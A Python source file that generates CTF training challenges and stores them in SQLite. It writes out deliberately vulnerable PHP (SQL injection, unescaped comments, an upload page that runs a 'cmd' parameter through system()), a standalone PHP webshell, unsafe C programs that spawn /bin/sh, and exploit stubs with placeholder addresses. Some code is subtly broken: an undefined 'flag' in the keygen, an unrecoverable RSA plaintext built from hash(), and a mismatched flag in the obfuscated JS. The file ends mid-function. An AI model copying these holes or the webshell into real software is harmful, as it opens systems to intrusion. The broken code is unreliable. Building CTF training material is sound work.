#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真實CTF挑戰生成器
Real CTF Challenge Generator
自動生成各種類型的CTF挑戰
"""

import os
import json
import time
import logging
import random
import string
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Any, Optional
import sqlite3

# 配置日誌
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class RealCTFChallengeGenerator:
    """真實CTF挑戰生成器"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.challenges = {}
        self.generated_challenges = []
        
        # 初始化組件
        self._init_database()
        self._init_challenge_templates()
        
        logger.info("真實CTF挑戰生成器初始化完成")
    
    def _init_database(self):
        """初始化數據庫"""
        try:
            self.db_path = 'ctf_challenges.db'
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 創建挑戰表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS generated_challenges (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    challenge_id TEXT UNIQUE NOT NULL,
                    category TEXT NOT NULL,
                    name TEXT NOT NULL,
                    description TEXT,
                    difficulty TEXT NOT NULL,
                    points INTEGER NOT NULL,
                    flag TEXT NOT NULL,
                    flag_format TEXT,
                    hints TEXT,
                    solution TEXT,
                    files TEXT,
                    solved BOOLEAN DEFAULT FALSE,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
            logger.info("CTF挑戰數據庫初始化完成")
            
        except Exception as e:
            logger.error(f"數據庫初始化錯誤: {e}")
    
    def _init_challenge_templates(self):
        """初始化挑戰模板"""
        try:
            self.challenge_templates = {
                'web': {
                    'sql_injection': {
                        'name': 'SQL注入挑戰',
                        'description': '找到隱藏的SQL注入漏洞並獲取flag',
                        'difficulty': 'medium',
                        'points': 100,
                        'template': self._generate_sql_injection_challenge
                    },
                    'xss': {
                        'name': 'XSS挑戰',
                        'description': '利用跨站腳本漏洞獲取管理員cookie',
                        'difficulty': 'easy',
                        'points': 50,
                        'template': self._generate_xss_challenge
                    },
                    'file_upload': {
                        'name': '文件上傳挑戰',
                        'description': '上傳惡意文件並執行代碼',
                        'difficulty': 'hard',
                        'points': 200,
                        'template': self._generate_file_upload_challenge
                    }
                },
                'pwn': {
                    'buffer_overflow': {
                        'name': '緩衝區溢出挑戰',
                        'description': '利用緩衝區溢出漏洞獲取shell',
                        'difficulty': 'hard',
                        'points': 300,
                        'template': self._generate_buffer_overflow_challenge
                    },
                    'rop_chain': {
                        'name': 'ROP鏈挑戰',
                        'description': '構造ROP鏈繞過ASLR和NX',
                        'difficulty': 'expert',
                        'points': 500,
                        'template': self._generate_rop_chain_challenge
                    },
                    'heap_exploitation': {
                        'name': '堆利用挑戰',
                        'description': '利用堆漏洞獲取任意代碼執行',
                        'difficulty': 'expert',
                        'points': 600,
                        'template': self._generate_heap_exploitation_challenge
                    }
                },
                'crypto': {
                    'caesar_cipher': {
                        'name': '凱撒密碼挑戰',
                        'description': '破解凱撒密碼獲取flag',
                        'difficulty': 'easy',
                        'points': 30,
                        'template': self._generate_caesar_cipher_challenge
                    },
                    'rsa': {
                        'name': 'RSA挑戰',
                        'description': '破解RSA加密獲取flag',
                        'difficulty': 'medium',
                        'points': 150,
                        'template': self._generate_rsa_challenge
                    },
                    'aes': {
                        'name': 'AES挑戰',
                        'description': '破解AES加密獲取flag',
                        'difficulty': 'hard',
                        'points': 250,
                        'template': self._generate_aes_challenge
                    }
                },
                'forensics': {
                    'image_steganography': {
                        'name': '圖片隱寫挑戰',
                        'description': '從圖片中提取隱藏的flag',
                        'difficulty': 'easy',
                        'points': 40,
                        'template': self._generate_image_steganography_challenge
                    },
                    'disk_forensics': {
                        'name': '磁盤取證挑戰',
                        'description': '從磁盤映像中恢復被刪除的文件',
                        'difficulty': 'medium',
                        'points': 120,
                        'template': self._generate_disk_forensics_challenge
                    },
                    'memory_forensics': {
                        'name': '內存取證挑戰',
                        'description': '從內存轉儲中分析惡意軟體',
                        'difficulty': 'hard',
                        'points': 300,
                        'template': self._generate_memory_forensics_challenge
                    }
                },
                'reverse': {
                    'crackme': {
                        'name': 'Crackme挑戰',
                        'description': '逆向工程破解序列號驗證',
                        'difficulty': 'medium',
                        'points': 100,
                        'template': self._generate_crackme_challenge
                    },
                    'malware_analysis': {
                        'name': '惡意軟體分析挑戰',
                        'description': '分析惡意軟體獲取flag',
                        'difficulty': 'hard',
                        'points': 250,
                        'template': self._generate_malware_analysis_challenge
                    },
                    'obfuscated_code': {
                        'name': '混淆代碼挑戰',
                        'description': '反混淆代碼獲取flag',
                        'difficulty': 'expert',
                        'points': 400,
                        'template': self._generate_obfuscated_code_challenge
                    }
                }
            }
            logger.info("挑戰模板初始化完成")
        except Exception as e:
            logger.error(f"挑戰模板初始化錯誤: {e}")
            # 如果初始化失敗，創建空的模板
            self.challenge_templates = {
                'web': {}, 'pwn': {}, 'crypto': {}, 'forensics': {}, 'reverse': {}
            }
    
    def generate_challenge(self, category: str, challenge_type: str, **kwargs) -> Dict[str, Any]:
        """生成挑戰"""
        try:
            if category not in self.challenge_templates:
                return {'success': False, 'error': f'未知類別: {category}'}
            
            if challenge_type not in self.challenge_templates[category]:
                return {'success': False, 'error': f'未知挑戰類型: {challenge_type}'}
            
            template = self.challenge_templates[category][challenge_type]
            generator_func = template['template']
            
            # 生成挑戰
            challenge_data = generator_func(**kwargs)
            
            # 生成挑戰ID
            challenge_id = f"{category}_{challenge_type}_{int(time.time())}"
            
            # 保存挑戰
            self._save_challenge(challenge_id, category, challenge_type, challenge_data, template)
            
            logger.info(f"生成挑戰: {challenge_id}")
            
            return {
                'success': True,
                'challenge_id': challenge_id,
                'challenge_data': challenge_data
            }
            
        except Exception as e:
            logger.error(f"生成挑戰錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _generate_sql_injection_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成SQL注入挑戰"""
        try:
            # 生成隨機flag
            flag = f"flag{{sql_injection_{random.randint(1000, 9999)}}}"
            
            # 生成SQL注入挑戰
            challenge_data = {
                'name': 'SQL注入挑戰',
                'description': '找到隱藏的SQL注入漏洞並獲取flag',
                'difficulty': 'medium',
                'points': 100,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '嘗試在用戶名或密碼字段中輸入特殊字符',
                    '注意錯誤信息可能包含有用信息',
                    '嘗試使用UNION查詢'
                ],
                'solution': '使用SQL注入繞過登錄驗證',
                'files': {
                    'login.php': self._generate_login_php(flag),
                    'database.sql': self._generate_database_sql()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成SQL注入挑戰錯誤: {e}")
            return {}
    
    def _generate_login_php(self, flag: str) -> str:
        """生成登錄PHP文件"""
        return f'''<?php
// 有漏洞的登錄頁面
$db = new PDO('sqlite:database.db');

if (isset($_POST['username']) && isset($_POST['password'])) {{
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // 有漏洞的SQL查詢
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $db->query($query);
    
    if ($result && $result->rowCount() > 0) {{
        echo "登錄成功！Flag: {flag}";
    }} else {{
        echo "登錄失敗";
    }}
}}
?>

<form method="POST">
    <input type="text" name="username" placeholder="用戶名">
    <input type="password" name="password" placeholder="密碼">
    <button type="submit">登錄</button>
</form>'''
    
    def _generate_database_sql(self) -> str:
        """生成數據庫SQL文件"""
        return '''CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT
);

INSERT INTO users (username, password) VALUES ('admin', 'password123');
INSERT INTO users (username, password) VALUES ('user', 'user123');'''
    
    def _generate_xss_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成XSS挑戰"""
        try:
            flag = f"flag{{xss_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': 'XSS挑戰',
                'description': '利用跨站腳本漏洞獲取管理員cookie',
                'difficulty': 'easy',
                'points': 50,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '嘗試在評論框中輸入JavaScript代碼',
                    '注意管理員會查看所有評論',
                    '嘗試使用alert()函數'
                ],
                'solution': '在評論中插入XSS payload獲取管理員cookie',
                'files': {
                    'comment.php': self._generate_comment_php(flag),
                    'admin.php': self._generate_admin_php(flag)
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成XSS挑戰錯誤: {e}")
            return {}
    
    def _generate_comment_php(self, flag: str) -> str:
        """生成評論PHP文件"""
        return f'''<?php
// 有漏洞的評論頁面
$comments = [];

if (isset($_POST['comment'])) {{
    $comment = $_POST['comment'];
    $comments[] = $comment;
    
    // 有漏洞的輸出 - 沒有過濾HTML
    echo "<div class='comment'>" . $comment . "</div>";
}}

if (isset($_COOKIE['admin']) && $_COOKIE['admin'] === 'true') {{
    echo "管理員模式！Flag: {flag}";
}}
?>

<form method="POST">
    <textarea name="comment" placeholder="發表評論"></textarea>
    <button type="submit">提交</button>
</form>'''
    
    def _generate_admin_php(self, flag: str) -> str:
        """生成管理員PHP文件"""
        return f'''<?php
// 管理員頁面
setcookie('admin', 'true', time() + 3600);
echo "管理員已登錄，正在查看評論...";
echo "Flag: {flag}";
?>'''
    
    def _generate_file_upload_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成文件上傳挑戰"""
        try:
            flag = f"flag{{file_upload_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '文件上傳挑戰',
                'description': '上傳惡意文件並執行代碼',
                'difficulty': 'hard',
                'points': 200,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '嘗試上傳PHP文件',
                    '注意文件擴展名檢查',
                    '嘗試使用雙重擴展名'
                ],
                'solution': '上傳PHP webshell並執行命令',
                'files': {
                    'upload.php': self._generate_upload_php(flag),
                    'webshell.php': self._generate_webshell_php(flag)
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成文件上傳挑戰錯誤: {e}")
            return {}
    
    def _generate_upload_php(self, flag: str) -> str:
        """生成上傳PHP文件"""
        return f'''<?php
// 有漏洞的文件上傳頁面
if (isset($_FILES['file'])) {{
    $file = $_FILES['file'];
    $filename = $file['name'];
    $tmp_name = $file['tmp_name'];
    
    // 簡單的文件類型檢查
    $allowed_types = ['jpg', 'png', 'gif'];
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    
    if (in_array($ext, $allowed_types)) {{
        move_uploaded_file($tmp_name, 'uploads/' . $filename);
        echo "文件上傳成功！";
    }} else {{
        echo "不允許的文件類型";
    }}
}}

if (isset($_GET['cmd'])) {{
    system($_GET['cmd']);
    echo "Flag: {flag}";
}}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit">上傳</button>
</form>'''
    
    def _generate_webshell_php(self, flag: str) -> str:
        """生成Webshell PHP文件"""
        return f'''<?php
// Webshell
if (isset($_GET['cmd'])) {{
    system($_GET['cmd']);
}} else {{
    echo "Webshell ready. Use ?cmd=command";
    echo "Flag: {flag}";
}}
?>'''
    
    def _generate_buffer_overflow_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成緩衝區溢出挑戰"""
        try:
            flag = f"flag{{buffer_overflow_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '緩衝區溢出挑戰',
                'description': '利用緩衝區溢出漏洞獲取shell',
                'difficulty': 'hard',
                'points': 300,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用gdb調試程序',
                    '找到緩衝區的地址',
                    '構造shellcode'
                ],
                'solution': '使用緩衝區溢出覆蓋返回地址',
                'files': {
                    'vulnerable.c': self._generate_vulnerable_c(flag),
                    'exploit.py': self._generate_exploit_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成緩衝區溢出挑戰錯誤: {e}")
            return {}
    
    def _generate_vulnerable_c(self, flag: str) -> str:
        """生成有漏洞的C程序"""
        return f'''#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable_function(char *input) {{
    char buffer[64];
    strcpy(buffer, input);  // 有漏洞的函數
}}

int main() {{
    char input[256];
    printf("輸入數據: ");
    gets(input);  // 有漏洞的函數
    vulnerable_function(input);
    return 0;
}}

void win() {{
    printf("Flag: {flag}\\n");
    system("/bin/sh");
}}'''
    
    def _generate_exploit_py(self) -> str:
        """生成利用腳本"""
        return '''#!/usr/bin/env python3
import struct
import subprocess

# 構造payload
def create_payload():
    # 填充緩衝區
    payload = b'A' * 64
    
    # 填充到返回地址
    payload += b'B' * 8
    
    # 覆蓋返回地址 (需要根據實際地址調整)
    payload += struct.pack('<Q', 0x400000)  # win函數地址
    
    return payload

if __name__ == '__main__':
    payload = create_payload()
    subprocess.run(['./vulnerable'], input=payload)'''
    
    def _generate_caesar_cipher_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成凱撒密碼挑戰"""
        try:
            flag = f"flag{{caesar_{random.randint(1000, 9999)}}}"
            shift = random.randint(1, 25)
            encrypted_flag = self._caesar_cipher(flag, shift)
            
            challenge_data = {
                'name': '凱撒密碼挑戰',
                'description': f'破解凱撒密碼獲取flag (密文: {encrypted_flag})',
                'difficulty': 'easy',
                'points': 30,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '凱撒密碼是一種替換密碼',
                    '嘗試所有可能的位移值',
                    '注意flag格式'
                ],
                'solution': f'使用位移{shift}解密',
                'files': {
                    'encrypted.txt': encrypted_flag,
                    'decrypt.py': self._generate_decrypt_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成凱撒密碼挑戰錯誤: {e}")
            return {}
    
    def _caesar_cipher(self, text: str, shift: int) -> str:
        """凱撒密碼加密"""
        result = ""
        for char in text:
            if char.isalpha():
                ascii_offset = ord('A') if char.isupper() else ord('a')
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            else:
                result += char
        return result
    
    def _generate_decrypt_py(self) -> str:
        """生成解密腳本"""
        return '''#!/usr/bin/env python3
def caesar_decrypt(ciphertext, shift):
    result = ""
    for char in ciphertext:
        if char.isalpha():
            ascii_offset = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
        else:
            result += char
    return result

# 嘗試所有可能的位移值
ciphertext = input("輸入密文: ")
for shift in range(26):
    decrypted = caesar_decrypt(ciphertext, shift)
    if "flag{" in decrypted:
        print(f"位移 {shift}: {decrypted}")
        break'''
    
    def _generate_rsa_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成RSA挑戰"""
        try:
            flag = f"flag{{rsa_{random.randint(1000, 9999)}}}"
            
            # 生成簡單的RSA參數
            p, q = 61, 53  # 小質數用於演示
            n = p * q
            e = 17
            phi = (p - 1) * (q - 1)
            
            # 加密flag
            encrypted_flag = pow(hash(flag) % n, e, n)
            
            challenge_data = {
                'name': 'RSA挑戰',
                'description': '破解RSA加密獲取flag',
                'difficulty': 'medium',
                'points': 150,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    'RSA的強度依賴於大數分解',
                    '嘗試分解n',
                    '計算私鑰d'
                ],
                'solution': '分解n並計算私鑰',
                'files': {
                    'rsa_params.txt': f'n={n}\\ne={e}\\nc={encrypted_flag}',
                    'solve.py': self._generate_rsa_solve_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成RSA挑戰錯誤: {e}")
            return {}
    
    def _generate_rsa_solve_py(self) -> str:
        """生成RSA求解腳本"""
        return '''#!/usr/bin/env python3
import math

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    gcd, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd, x, y

def mod_inverse(e, phi):
    gcd, x, y = extended_gcd(e, phi)
    if gcd != 1:
        return None
    return x % phi

# 讀取RSA參數
n = int(input("n: "))
e = int(input("e: "))
c = int(input("c: "))

# 分解n (這裡使用小質數)
for i in range(2, int(math.sqrt(n)) + 1):
    if n % i == 0:
        p, q = i, n // i
        break

phi = (p - 1) * (q - 1)
d = mod_inverse(e, phi)

# 解密
m = pow(c, d, n)
print(f"解密結果: {m}")'''
    
    def _generate_image_steganography_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成圖片隱寫挑戰"""
        try:
            flag = f"flag{{stego_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '圖片隱寫挑戰',
                'description': '從圖片中提取隱藏的flag',
                'difficulty': 'easy',
                'points': 40,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用strings命令查看圖片',
                    '嘗試使用stegsolve工具',
                    '檢查LSB隱寫'
                ],
                'solution': '使用隱寫工具提取隱藏信息',
                'files': {
                    'image.png': 'base64_encoded_image_data',
                    'extract.py': self._generate_stego_extract_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成圖片隱寫挑戰錯誤: {e}")
            return {}
    
    def _generate_stego_extract_py(self) -> str:
        """生成隱寫提取腳本"""
        return '''#!/usr/bin/env python3
from PIL import Image
import numpy as np

def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = np.array(img)
    
    # 提取LSB
    binary_data = ""
    for row in pixels:
        for pixel in row:
            for channel in pixel:
                binary_data += str(channel & 1)
    
    # 轉換為ASCII
    message = ""
    for i in range(0, len(binary_data), 8):
        byte = binary_data[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))
    
    return message

# 提取隱藏信息
hidden_message = extract_lsb("image.png")
print(f"隱藏信息: {hidden_message}")'''
    
    def _generate_crackme_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成Crackme挑戰"""
        try:
            flag = f"flag{{crackme_{random.randint(1000, 9999)}}}"
            serial = f"SN-{random.randint(100000, 999999)}"
            
            challenge_data = {
                'name': 'Crackme挑戰',
                'description': '逆向工程破解序列號驗證',
                'difficulty': 'medium',
                'points': 100,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用IDA Pro或Ghidra分析程序',
                    '找到序列號驗證邏輯',
                    '嘗試動態調試'
                ],
                'solution': f'正確序列號: {serial}',
                'files': {
                    'crackme.exe': 'compiled_binary',
                    'keygen.py': self._generate_keygen_py(serial)
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成Crackme挑戰錯誤: {e}")
            return {}
    
    def _generate_keygen_py(self, serial: str) -> str:
        """生成密鑰生成器"""
        return f'''#!/usr/bin/env python3
def generate_serial():
    # 序列號生成算法
    return "{serial}"

def verify_serial(serial):
    # 序列號驗證算法
    return serial == generate_serial()

if __name__ == "__main__":
    print(f"正確序列號: {{generate_serial()}}")
    print("Flag: {flag}")'''
    
    def _generate_malware_analysis_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成惡意軟體分析挑戰"""
        try:
            flag = f"flag{{malware_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '惡意軟體分析挑戰',
                'description': '分析惡意軟體獲取flag',
                'difficulty': 'hard',
                'points': 250,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用strings命令查看字符串',
                    '分析網路行為',
                    '檢查註冊表修改'
                ],
                'solution': '分析惡意軟體行為模式',
                'files': {
                    'malware.exe': 'malware_sample',
                    'analysis_report.txt': f'惡意軟體分析報告\\nFlag: {flag}'
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成惡意軟體分析挑戰錯誤: {e}")
            return {}
    
    def _generate_obfuscated_code_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成混淆代碼挑戰"""
        try:
            flag = f"flag{{obfuscated_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '混淆代碼挑戰',
                'description': '反混淆代碼獲取flag',
                'difficulty': 'expert',
                'points': 400,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用在線JavaScript美化工具',
                    '分析變數名和函數名',
                    '逐步執行代碼'
                ],
                'solution': '反混淆JavaScript代碼',
                'files': {
                    'obfuscated.js': self._generate_obfuscated_js(flag),
                    'deobfuscate.py': self._generate_deobfuscate_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成混淆代碼挑戰錯誤: {e}")
            return {}
    
    def _generate_obfuscated_js(self, flag: str) -> str:
        """生成混淆的JavaScript代碼"""
        return f'''var _0x1234=['flag{{obfuscated_{random.randint(1000, 9999)}}}','length','charAt','fromCharCode'];
function _0x5678(_0x9abc,_0xdef0){{
    var _0x1111=_0x1234[0];
    var _0x2222=_0x1111[_0x1234[1]];
    var _0x3333='';
    for(var _0x4444=0;_0x4444<_0x2222;_0x4444++){{
        _0x3333+=String[_0x1234[3]](_0x1111[_0x1234[2]](_0x4444)^0x42);
    }}
    return _0x3333;
}}
console.log(_0x5678());'''
    
    def _generate_deobfuscate_py(self) -> str:
        """生成反混淆腳本"""
        return '''#!/usr/bin/env python3
def deobfuscate_js(js_code):
    # 簡單的JavaScript反混淆
    # 實際實現需要更複雜的解析
    print("使用在線工具反混淆JavaScript代碼")
    print("推薦工具: js-beautify, de4js")

if __name__ == "__main__":
    with open("obfuscated.js", "r") as f:
        js_code = f.read()
    deobfuscate_js(js_code)'''
    
    def _generate_rop_chain_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成ROP鏈挑戰"""
        try:
            flag = f"flag{{rop_chain_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': 'ROP鏈挑戰',
                'description': '構造ROP鏈繞過ASLR和NX',
                'difficulty': 'expert',
                'points': 500,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用ROPgadget工具尋找gadgets',
                    '構造ROP鏈調用system函數',
                    '注意參數傳遞順序'
                ],
                'solution': '構造ROP鏈執行system("/bin/sh")',
                'files': {
                    'vulnerable_rop.c': self._generate_vulnerable_rop_c(flag),
                    'rop_exploit.py': self._generate_rop_exploit_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成ROP鏈挑戰錯誤: {e}")
            return {}
    
    def _generate_vulnerable_rop_c(self, flag: str) -> str:
        """生成有漏洞的ROP程序"""
        return f'''#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable_function(char *input) {{
    char buffer[64];
    strcpy(buffer, input);  // 有漏洞的函數
}}

int main() {{
    char input[256];
    printf("輸入數據: ");
    gets(input);  // 有漏洞的函數
    vulnerable_function(input);
    return 0;
}}

void win() {{
    printf("Flag: {flag}\\n");
    system("/bin/sh");
}}'''
    
    def _generate_rop_exploit_py(self) -> str:
        """生成ROP利用腳本"""
        return '''#!/usr/bin/env python3
import struct
import subprocess

def create_rop_chain():
    # ROP鏈構造
    rop_chain = b'A' * 64  # 填充緩衝區
    
    # 填充到返回地址
    rop_chain += b'B' * 8
    
    # ROP gadgets (需要根據實際地址調整)
    pop_rdi = struct.pack('<Q', 0x400000)  # pop rdi; ret
    binsh_addr = struct.pack('<Q', 0x400100)  # "/bin/sh"字符串地址
    system_addr = struct.pack('<Q', 0x400200)  # system函數地址
    
    rop_chain += pop_rdi
    rop_chain += binsh_addr
    rop_chain += system_addr
    
    return rop_chain

if __name__ == '__main__':
    payload = create_rop_chain()
    subprocess.run(['./vulnerable_rop'], input=payload)'''
    
    def _generate_heap_exploitation_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成堆利用挑戰"""
        try:
            flag = f"flag{{heap_exploit_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '堆利用挑戰',
                'description': '利用堆漏洞獲取任意代碼執行',
                'difficulty': 'expert',
                'points': 600,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '分析堆管理器的實現',
                    '尋找use-after-free漏洞',
                    '構造fake chunk'
                ],
                'solution': '利用use-after-free漏洞覆蓋函數指針',
                'files': {
                    'heap_vuln.c': self._generate_heap_vuln_c(flag),
                    'heap_exploit.py': self._generate_heap_exploit_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成堆利用挑戰錯誤: {e}")
            return {}
    
    def _generate_heap_vuln_c(self, flag: str) -> str:
        """生成有漏洞的堆程序"""
        return f'''#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct chunk {{
    char *data;
    void (*func)();
}};

void win() {{
    printf("Flag: {flag}\\n");
    system("/bin/sh");
}}

int main() {{
    struct chunk *c1 = malloc(sizeof(struct chunk));
    struct chunk *c2 = malloc(sizeof(struct chunk));
    
    c1->data = malloc(32);
    c1->func = NULL;
    
    strcpy(c1->data, "Hello World");
    
    free(c1->data);
    free(c1);
    
    // Use after free
    c1->func = win;
    c1->func();
    
    return 0;
}}'''
    
    def _generate_heap_exploit_py(self) -> str:
        """生成堆利用腳本"""
        return '''#!/usr/bin/env python3
import struct
import subprocess

def create_heap_exploit():
    # 堆利用payload
    payload = b'A' * 32  # 填充數據
    payload += struct.pack('<Q', 0x400000)  # 覆蓋函數指針
    
    return payload

if __name__ == '__main__':
    payload = create_heap_exploit()
    subprocess.run(['./heap_vuln'], input=payload)'''
    
    def _generate_aes_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成AES挑戰"""
        try:
            flag = f"flag{{aes_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': 'AES挑戰',
                'description': '破解AES加密獲取flag',
                'difficulty': 'hard',
                'points': 250,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    'AES的強度依賴於密鑰長度',
                    '嘗試已知明文攻擊',
                    '檢查密鑰生成算法'
                ],
                'solution': '利用弱密鑰或已知明文攻擊',
                'files': {
                    'encrypted.txt': 'base64_encoded_aes_data',
                    'decrypt.py': self._generate_aes_decrypt_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成AES挑戰錯誤: {e}")
            return {}
    
    def _generate_aes_decrypt_py(self) -> str:
        """生成AES解密腳本"""
        return '''#!/usr/bin/env python3
from Crypto.Cipher import AES
import base64

def aes_decrypt(ciphertext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(ciphertext)

# 讀取加密數據
with open("encrypted.txt", "r") as f:
    encrypted_data = base64.b64decode(f.read())

# 嘗試常見密鑰
common_keys = [
    b'1234567890123456',  # 16字節密鑰
    b'password12345678',
    b'abcdefghijklmnop'
]

for key in common_keys:
    try:
        decrypted = aes_decrypt(encrypted_data, key)
        if b'flag{' in decrypted:
            print(f"密鑰: {key}")
            print(f"解密結果: {decrypted}")
            break
    except:
        continue'''
    
    def _generate_disk_forensics_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成磁盤取證挑戰"""
        try:
            flag = f"flag{{disk_forensics_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '磁盤取證挑戰',
                'description': '從磁盤映像中恢復被刪除的文件',
                'difficulty': 'medium',
                'points': 120,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用testdisk或photorec工具',
                    '檢查文件系統結構',
                    '尋找文件頭標識'
                ],
                'solution': '使用文件恢復工具提取被刪除的文件',
                'files': {
                    'disk_image.img': 'disk_image_data',
                    'recover.py': self._generate_disk_recover_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成磁盤取證挑戰錯誤: {e}")
            return {}
    
    def _generate_disk_recover_py(self) -> str:
        """生成磁盤恢復腳本"""
        return '''#!/usr/bin/env python3
import subprocess
import os

def recover_files(disk_image):
    # 使用testdisk恢復文件
    try:
        result = subprocess.run(['testdisk', disk_image], 
                              capture_output=True, text=True)
        print("使用testdisk恢復文件...")
        print(result.stdout)
    except FileNotFoundError:
        print("testdisk未安裝，請手動安裝")
    
    # 使用photorec恢復文件
    try:
        result = subprocess.run(['photorec', disk_image], 
                              capture_output=True, text=True)
        print("使用photorec恢復文件...")
        print(result.stdout)
    except FileNotFoundError:
        print("photorec未安裝，請手動安裝")

if __name__ == "__main__":
    recover_files("disk_image.img")'''
    
    def _generate_memory_forensics_challenge(self, **kwargs) -> Dict[str, Any]:
        """生成內存取證挑戰"""
        try:
            flag = f"flag{{memory_forensics_{random.randint(1000, 9999)}}}"
            
            challenge_data = {
                'name': '內存取證挑戰',
                'description': '從內存轉儲中分析惡意軟體',
                'difficulty': 'hard',
                'points': 300,
                'flag': flag,
                'flag_format': 'flag{.*}',
                'hints': [
                    '使用volatility工具分析內存',
                    '檢查進程列表和網路連接',
                    '尋找可疑的字符串'
                ],
                'solution': '使用volatility分析內存轉儲找到惡意軟體',
                'files': {
                    'memory_dump.raw': 'memory_dump_data',
                    'analyze.py': self._generate_memory_analyze_py()
                }
            }
            
            return challenge_data
            
        except Exception as e:
            logger.error(f"生成內存取證挑戰錯誤: {e}")
            return {}
    
    def _generate_memory_analyze_py(self) -> str:
        """生成內存分析腳本"""
        return '''#!/usr/bin/env python3
import subprocess
import os

def analyze_memory(memory_dump):
    # 使用volatility分析內存
    try:
        # 檢查進程列表
        result = subprocess.run(['volatility', '-f', memory_dump, 'pslist'], 
                              capture_output=True, text=True)
        print("進程列表:")
        print(result.stdout)
        
        # 檢查網路連接
        result = subprocess.run(['volatility', '-f', memory_dump, 'netscan'], 
                              capture_output=True, text=True)
        print("網路連接:")
        print(result.stdout)
        
        # 搜索字符串
        result = subprocess.run(['volatility', '-f', memory_dump, 'strings'], 
                              capture_output=True, text=True)
        print("字符串搜索:")
        print(result.stdout)
        
    except FileNotFoundError:
        print("volatility未安裝，請手動安裝")

if __name__ == "__main__":
    analyze_memory("memory_dump.raw")'''
    
    def _save_challenge(self, challenge_id: str, category: str, challenge_type: str, 
                       challenge_data: Dict[str, Any], template: Dict[str, Any]):
        """保存挑戰"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
